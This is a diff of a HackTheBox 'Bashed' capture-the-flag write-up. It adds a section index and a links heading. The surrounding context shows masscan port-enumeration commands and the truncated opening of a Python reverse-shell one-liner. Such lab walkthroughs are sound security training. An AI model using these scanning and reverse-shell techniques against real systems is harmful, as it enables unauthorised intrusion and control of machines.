@@ -11,6 +11,13 @@
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6cf650ac-4c3d-4149-9393-626c443b2480)
 
 
+## Sections
++ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/04_Bashed.md#enumeration)
++ [Gaining Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/04_Bashed.md#gaining-access)
++ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/04_Bashed.md#privilege-escalation)
++ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/04_Bashed.md#links)
+
+
 ## Enumeration
 + `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.68 -e tun0 > ports`
 + `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -81,6 +88,8 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 + Get the root shell:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c1b923d8-5e44-4c00-b9ab-c0405253686a)
 
+
+# Links
 
 # References & Alternatives
 + https://vvmlist.github.io/#bashed
